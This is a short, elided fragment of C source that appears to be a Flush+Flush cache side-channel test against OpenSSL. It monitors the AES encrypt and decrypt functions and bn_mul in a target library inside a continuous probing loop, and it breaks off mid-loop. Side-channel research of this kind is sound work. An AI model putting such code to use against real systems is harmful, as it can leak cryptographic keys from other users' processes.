/*
 * Simple Flush+Flush test against OpenSSL AES
...
int main(int ac, char **av) {
    ...
    printf("Flush+Flush Attack (Continuous Mode)\n");
    printf("Target: %s\n", libpath);
    ...
    // Setup Flush+Flush
    ff_t ff = ff_prepare();
    ff_monitor(ff, aes_encrypt);
    ff_monitor(ff, aes_decrypt);
    ff_monitor(ff, bn_mul);
    ...
    while (running) {
        ff_probe(ff, res);
        int l = ff_trace(ff, SAMPLES, res, SLOT, THRESHOLD, 500);
        round++;
